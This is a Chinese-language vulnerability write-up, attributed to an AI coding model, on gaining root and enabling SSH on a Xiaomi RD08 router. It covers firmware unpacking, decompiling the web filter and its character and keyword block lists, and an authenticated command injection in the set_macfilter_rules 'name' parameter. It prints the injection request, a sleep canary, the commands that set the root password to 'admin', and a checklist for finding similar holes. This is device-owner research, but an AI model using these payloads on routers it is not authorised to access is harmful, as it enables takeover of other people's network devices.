# 小米路由器 BE6500 Pro (RD08) 固件 1.1.96 SSH 开启 — 全过程文档

> **声明**：本项目的漏洞分析过程、利用脚本与文档由月之暗面（Moonshot AI）的 K3 模型（Kimi Code）实现，仅供学习与研究使用。请勿用于未经授权的设备或任何非法用途，使用者须自行承担一切后果。

> 适用对象：固件 1.1.96（已带 hackCheck v3 字符过滤，xmir-patcher 全部 exploit 失效）的小米 RD08。
> 核心成果：发现并验证一个新注入点（`set_macfilter_rules` 的 `name` 参数），认证后 root RCE，一键开 SSH。
> 配套工具：[`rd08_ssh_enable.py`](./rd08_ssh_enable.py)（实测可用）——交互式引导输入
> IP/管理密码，开启前二次确认；菜单含「临时开启」「软固化（开机自启）」「深度固化（bdata/crash，
> 三次重启，参考 [Wetoria/xiaomi-be6500pro](https://github.com/Wetoria/xiaomi-be6500pro)）」。
> 依赖：`pip install requests ssh2-python`，然后 `python rd08_ssh_enable.py` 即可。

---

## 0. 风险与法律边界

- 仅对**自己的设备**操作；认证后 RCE 需要管理密码，不降低他人设备安全性。
- 开 SSH 本身不改分区、可逆（重启即失效）；备份/固化等操作见 §7 风险提示。
- 该漏洞建议上报小米安全中心（security.mi.com）。

## 1. 背景与失败的开端

参考[恩山 thread-8429051](https://www.right.com.cn/forum/thread-8429051-1-1.html)，常规路线是
[xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher)：设置 IP → 一键 exploit 开 SSH → 备份。

在 RD08 @ 1.1.96 上实测**三条 exploit 链全部失效**：

| exploit | 原理 | 失败原因 |
|---|---|---|
| connect6 | arn_switch / start_binding / set_mac_filter 命令注入 | 参数被 hackCheck v3 拦截或漏洞已修 |
| connect5 | smartcontroller | hackCheck v3 明确封杀 |
| connect7 | get_icon | 该 API 在本固件不存在 |

telnet 端口（23）虽然开放，但 SN 派生默认密码（`md5(SN+salt)[:8]` 及其变体）全部登录失败，
1.1.96 的 root 密码已是随机化凭据。

## 2. 侦查（无凭据阶段）

```
GET http://192.168.31.1/cgi-bin/luci/api/xqsystem/init_info
```

无需认证即可拿到：型号（hardware=RD08）、固件版本、SN（id 字段）、MAC、功能特性表、
`newEncryptMode`（决定登录哈希是 sha256 还是 sha1）。

端口扫描（1-9999）实测开放：23(telnet)、53、80、443、784(tbusd)、5351(upnp)、
8080/8086(米家自动化极客版)/8098/8099、8883(mosquitto/miot)、8900。

## 3. hackCheck 机制分析（绕过的理论基础）

固件 Web 层（LuCI 定制版）对所有 API 参数做统一过滤，逻辑在
`xiaoqiang.util.XQSecureUtil`（反编译确认）：

### 3.1 hackCheck(key, value) — 参数级过滤

```lua
if skipKeyTable[key] then return value end          -- 白名单参数：完全不过滤！
if string.find(value, "[`;|$&\n]") then return nil end  -- 其他参数：含这些字符即拒绝
return value
```

**白名单参数名**（为兼容密码/SSID 里的特殊字符而设）：
`name, password, password2g/5g/5g2, npassword, pppoeName, pppoePwd, pwd, pwd1-3,
newPwd, service, ssid, ssid1-3, ssid2g/5g/5g2, nssid, nssid5G/5G2, username, apn,
pdp, user, passwd, contact_phone, phoneList, msgtext, acs_username, acs_password,
conn_username, conn_password`

### 3.2 cmdSafeCheck(cmd) — 命令级关键词过滤（部分 exec 调用点）

对完整命令行小写后匹配子串：`'`、`;`、`nvram`、`dropbear`、`bdata`，命中即拒绝（错误码 1523）。
**注意：`\n`、`|`、`$`、`&`、反引号、空格都不在黑名单。**

### 3.3 parseCmdline — 转义器

转义 `\`、反引号、`"`、`$`、`&`、`|`、`;`，但**不处理 `\n` 和 `'`**。

### 3.4 结论

绕过条件 = 找到一个 exec 调用点，使得：**白名单参数**的值**无引号/双引号**拼入命令行，
且该处**没有 cmdSafeCheck**（或 payload 避开 5 个关键词并用 `\n`/`$()` 做分隔）。
单引号包裹 + `'` 被 cmdSafeCheck 拦死的调用点（如 upgradeRom）不可利用。

## 4. 固件获取与解包

1. 固件下载（[miuirom.org 有官方直链索引](https://miuirom.org/miwifi/xiaomi-router-6500-pro)）：
   `http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rd08/miwifi_rd08_firmware_708c2_1.1.96.bin`
2. HDR1 容器格式：`XQImgHdr`(48B) + 若干 `XQImgFile` 段。用 Python struct 解出 `root.ubi`：
   ```python
   magic, sign, crc32, typ, model = struct.unpack_from('<IIIHH', data, 0)
   files = struct.unpack_from('<8I', data, 16)   # 各段偏移
   # 每段: <HHIIHH + 32字节名字，随后是 size 字节 payload
   ```
3. UBI 解包（xmir-patcher 自带 ubireader）：
   `PYTHONPATH=xmir-patcher/xmir_base python xmir-patcher/xmir_base/ubireader/scripts/ubireader_extract_images.py -o out root.ubi`
4. 得到 squashfs 卷，用 WSL 的 `unsquashfs -f -ignore-errors` 解出 rootfs
   （dev 节点报权限错误可忽略；Windows 上 rg 无法读 WSL 提出的符号链接，后续 grep 都在 WSL 内做）。

## 5. Lua 字节码反编译（关键工具）

固件中所有 Lua 是小米私有 **Fate/Z** 混淆字节码：
magic 为 `\x1bFate/Z\x1b`（8 字节，替换标准 `\x1bLua`），字符串常量 XOR 加密、opcode 重排。

使用 [Jinzear](https://github.com/0pepsi/Jinzear) 还原：

```bash
python jinzear.py -d target.lua -o out.lua    # 反编译为源码
python jinzear.py -s target.lua               # 只提取字符串（快速分拣用）
python jinzear.py -D target.lua -o out.dis    # 反汇编（反编译寄存器混淆时交叉验证用）
```

注意：jinzear 反编译偶有寄存器混淆（如 formvalue 结果显示为 "nil" 常量），
**下结论前用 `-D` 反汇编核实关键数据流**。

## 6. 漏洞：set_macfilter_rules 的 name 参数注入

### 数据流（字节码级证据）

1. `luci/controller/api/xqsystem.lua`：`entry({"api","xqsystem","set_macfilter_rules"}, call("set_macfilter_rules"))`，
   需 stok 认证（sysauth=admin）
2. handler 中 `mac` 有正则 `^[0-9a-fA-F:;]+$` + macaddr 校验；**`name` 是裸 `formvalue("name")` 无任何校验**
   （对照：单数接口 `set_mac_filter` 的 name 有 `?commonstr` 校验——复数接口漏了）
3. `name` 属 hackCheck 白名单 → `$()`、反引号、`\n`、`&&` 全通过
4. name 按 `;` 切分后与 mac 配对，逐对调 `XQFirewall.setMacFilter(upper(mac), name, option, ...)`
5. `XQFirewall.setMacFilter` 末尾：
   ```lua
   cmd = "/usr/sbin/macfilter " .. action .. " " .. mode .. " " .. mac
   if name then cmd = cmd .. " rulename=" .. name end   -- 无引号、无转义、无 cmdSafeCheck
   os.execute(cmd)
   ```

### 利用约束

- payload 不能含 `;`（会被切分）→ 用 `$(cmd)` 或 `$(c1 && c2)`
- mac 必须是**未占用**的合法 MAC（已存在时 add 走 update 分支不触发 exec）→ 每次换 MAC
- 副作用：会在 macfilter 表里留垃圾规则，利用后要用 `option=del` 清理

### 验证（时延金丝雀）

```
POST /cgi-bin/luci/;stok=<stok>/api/xqsystem/set_macfilter_rules
mac=0A:11:22:33:44:51&name=a$(sleep 3)b&option=add&wan=
```
响应 0.5s → 3.6s 即确认 RCE。

## 7. 开 SSH 的完整命令序列

认证（拿 stok）后依次注入（详见 `rd08_ssh_enable.py`）：

```sh
nvram set ssh_en=1 && nvram commit
sed -i "s/channel=.*/channel=\"debug\"/g" /etc/init.d/dropbear && /etc/init.d/dropbear start
echo -e "admin\nadmin" | passwd root
```

之后 `ssh root@192.168.31.1`（密码 admin）。**重启后 dropbear 配置复原、SSH 失效**，
重跑脚本即可；要永久化可用 xmir-patcher 菜单 6（install_ssh）或社区固化方案
（写 crash 分区 + bdata，三次重启，有变砖风险，操作前务必备份全分区）。

## 8. 备份与信息收集（拿到 SSH 后）

xmir-patcher 此时可正常走 SSH 通道：

```bash
printf 'admin\n' | python read_info.py       # 全量设备信息 → full_info.txt
printf 'admin\n' | python create_backup.py   # 全 mtd 分区备份 → backups/
```

RD08 分区共 37 个，关键：`0SBL1/0APPSBL`(bootloader)、`0ART`(无线校准)、`bdata`、`crash`、
`rootfs/rootfs_1`(双系统)、`kernel`。（cfg/user/plugin/data 四个分区本身为空，备份出 0 字节属正常。）

## 9. 清理与痕迹

- 删除注入留下的 macfilter 规则（脚本已自动清理）
- diag 探测可能短暂打挂 diag 服务（500），约 10 秒自愈，无残留
- nvram 中 `ssh_en=1` 会保留（无害，重启后 dropbear 因 channel 复原也不会启动）

## 10. 可复用检查清单（换型号/换固件时）

1. `init_info` 拿型号/固件号/SN/newEncryptMode
2. 跑 xmir-patcher 的 connect.py 试现成 exploit（5 分钟）
3. 不行就下固件 → HDR1/UBI/squashfs 解包 → jinzear 反编译
4. 先反编译 `xiaoqiang/util/XQSecureUtil.lua` 确认 hackCheck 级别与白名单
5. 批量 `-s` 提取字符串，分拣含 `forkExec|os.execute|io.popen` 的文件
6. 逐一审计数据流：白名单参数 + 无引号拼接 + 无 cmdSafeCheck = 可利用
7. 金丝雀时延验证（sleep），再上真实 payload
